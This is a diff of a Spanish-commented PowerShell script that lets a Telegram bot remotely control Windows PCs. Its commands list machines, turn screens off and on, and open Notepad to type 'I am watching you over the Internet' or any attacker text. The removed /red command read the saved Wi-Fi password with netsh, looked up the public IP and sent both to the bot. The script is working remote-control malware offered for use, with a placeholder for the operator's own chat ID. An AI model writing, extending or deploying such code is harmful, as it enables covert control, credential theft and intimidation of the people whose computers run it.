@@ -8,12 +8,7 @@ $ChatID = "1018796719"                                    # REEMPLAZA CON TU CHA
 $URL    = "https://api.telegram.org/bot" + $Token
 $MiPC   = $env:COMPUTERNAME
 $User   = $env:USERNAME
-# ==============================================================================
-# NO BORRAR #############################################################
-# ==============================================================================
-# ==============================================================================
-# CONFIGURACIÓN DEL BOT DE TELEGRAM 
-# ==============================================================================
+
 # Registrar APIs de pantalla de Windows de forma segura
 try {
     $MethodDefinition = '[DllImport("user32.dll")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);'
@@ -48,7 +43,7 @@ while ($true) {
     try {
         $Updates = Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=15" -Method Get
         
-                foreach ($Update in $Updates.result) {
+        foreach ($Update in $Updates.result) {
             $LastUpdateID = $Update.update_id + 1
             $TextoRecibido = $Update.message.text
             $RemitenteChatID = $Update.message.chat.id
@@ -74,7 +69,6 @@ while ($true) {
                 $IdUnico = ([BitConverter]::ToUInt16($HashBytes, 0) % 900) + 100
                 $MiIDNum = [string]$IdUnico
 
-
                 # --- COMANDO GLOBAL: /lista ---
                 if ($Comando -eq "/lista") {
                     $RespuestaLista = "🖥️ EQUIPO EN LINEA:`nID Numerico: [" + $MiIDNum + "] -> " + $User + "@" + $MiPC
@@ -91,8 +85,9 @@ while ($true) {
                                   "Comandos Individuales (Deja un espacio y pon el numero de la PC):`n" +
                                   "• /pantalla_off [Numero]`n" +
                                   "• /pantalla_on [Numero]`n" +
-                                  "• /notepad [Numero]`n`n" +
-                                  "Ejemplo de uso: /notepad " + $MiIDNum
+                                  "• /notepad [Numero]`n" +
+                                  "• /note [Numero] [Mensaje personalizado]`n`n" +
+                                  "Ejemplo de uso: /note " + $MiIDNum + " hola como estas"
                     
                     [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda })
                     continue
@@ -101,7 +96,7 @@ while ($true) {
                 # VALIDACIÓN CRÍTICA: Solo ejecuta si el número coincide con el de esta máquina
                 if ($IDDestino -eq $MiIDNum -and $IDDestino -ne "") {
                  
-                 switch ($Comando) {
+                    switch ($Comando) {
                  
                         "/pantalla_off" {
                             $rundll = New-Object -ComObject WScript.Shell
@@ -124,64 +119,32 @@ while ($true) {
                             $wsh = New-Object -ComObject WScript.Shell
                             $wsh.SendKeys("Te estoy observando por Internet... 👀")
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
-                            continue # 👈 CORREGIDO: Esto evita que se choque con el comando /red
+                            continue 
                         }
-                        
-                                                                         "/red" {
-                            # 1. Detectar la placa de red real con conexion activa
-                            $RutaActiva = Get-NetRoute -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue | Select-Object -First 1
-                            
-                            $NombreInterfaz = "No detectada"
-                            $IpPrivada = "No detectada"
-                            $NombreWiFi = "No conectado (Es cable Ethernet)"
-                            $ClaveWiFi = "No aplica"
 
-                            if ($RutaActiva) {
-                                $NombreInterfaz = $RutaActiva.InterfaceAlias
-                                $IpPrivada = (Get-NetIPAddress -InterfaceIndex $RutaActiva.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue).IPAddress
+                        "/note" {
+                            # Junta todas las palabras que vienen después del comando y del ID
+                            $MensajePersonalizado = ($Partes[2..($Partes.Count - 1)]) -join " "
+
+                            if ($null -ne $MensajePersonalizado -and $MensajePersonalizado -trim() -ne "") {
+                                Start-Process "notepad.exe"
+                                Start-Sleep -Milliseconds 500
                                 
-                                # 2. Si esta usando Wi-Fi, extraer el nombre de la red y su contraseña
-                                if ($NombreInterfaz -like "*Wi-Fi*" -or $NombreInterfaz -like "*Wireless*") {
-                                    # Obtiene el nombre del perfil de red activo
-                                    $Perfil = (netsh wlan show interfaces | Select-String -Pattern "^\s+SSID\s+:\s+(.+)$")
-                                    if ($Perfil) {
-                                        $NombreWiFi = $Perfil.Matches.Groups[1].Value.Trim()
-                                        
-                                        # Comando nativo para revelar la clave guardada de ese perfil específico
-                                        $XmlInfo = (netsh wlan show profile name="$NombreWiFi" key=clear | Select-String -Pattern "Contenido de la clave\s+:\s+(.+)$")
-                                        if ($XmlInfo) {
-                                            $ClaveWiFi = $XmlInfo.Matches.Groups[1].Value.Trim()
-                                        } else {
-                                            $ClaveWiFi = "No encontrada o red abierta"
-                                        }
-                                    }
-                                }
+                                # Copiar y pegar evita que se pierdan letras al tipear textos largos
+                                Set-Clipboard -Value $MensajePersonalizado
+                                $wsh = New-Object -ComObject WScript.Shell
+                                $wsh.SendKeys("^v")
+                                
+                                $Respuesta = "Bloc de notas abierto con tu mensaje en ID $MiIDNum"
+                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
                             }
-
-                            # 3. Obtener la IP Publica
-                            $IpPublica = "Desconocida"
-                            try {
-                                $IpPublica = (Invoke-RestMethod -Uri "https://icanhazip.com" -TimeoutSec 5).Trim()
-                            } catch {}
-
-                            # 4. Armar el reporte de texto plano seguro
-                            $ReporteRed = "REPORTE DE RED (ID: $MiIDNum)`nAdaptador: $NombreInterfaz`nNombre Wi-Fi: $NombreWiFi`nClave Wi-Fi: $ClaveWiFi`nIP Privada: $IpPrivada`nIP Publica: $IpPublica"
-                                          
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $ReporteRed })
                             continue
                         }
-
-
-
-
-
-
-                    } # Cierre limpio del switch
-                }
-            }
-        }
+                    } # 👈 AQUÍ CIERRA EL SWITCH
+                } # 👈 AQUÍ CIERRA EL IF DE VALIDACIÓN DE ID
+            } # 👈 AQUÍ CIERRA EL IF DE REMITENTE Y TEXTO
+        } # 👈 AQUÍ CIERRA EL FOREACH DE UPDATES
     } catch {
-        Start-Sleep -Seconds 3
-    }
-    Start-Sleep -Seconds 2
-}
+        Start-Sleep -Seconds 2
+    } # 👈 AQUÍ CIERRA EL CATCH DEL BUCLE PRINCIPAL
+} # 👈 AQUÍ CIERRA EL WHILE
